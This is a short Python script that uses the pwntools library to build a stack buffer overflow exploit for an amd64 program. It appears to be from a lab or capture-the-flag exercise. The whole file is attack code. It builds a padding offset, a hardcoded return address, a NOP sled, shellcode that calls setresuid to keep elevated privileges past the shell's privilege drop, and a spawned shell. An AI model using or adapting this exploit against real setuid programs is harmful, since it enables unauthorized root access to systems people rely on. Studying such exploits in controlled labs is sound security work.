#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

OFFSET = 88
MAX_LEN = 1024
SLED_SIZE = 300
RET_ADDR = 0x7fffffffed90

def payload():
    # Change user to bypass dash protection
    priv_shellcode = asm('''
        xor rax, rax
        mov al, 107  /* geteuid */
        syscall
        mov rdi, rax
        mov rsi, rax
        mov rdx, rax
        xor rax, rax
        mov al, 117  /* setresuid */
        syscall
    ''')
    SHELLCODE = priv_shellcode + asm(shellcraft.sh())
    sled = b"\x90" * SLED_SIZE
    payload = b"A" * OFFSET
    payload += p64(RET_ADDR)
    payload += sled
    payload += SHELLCODE
    return payload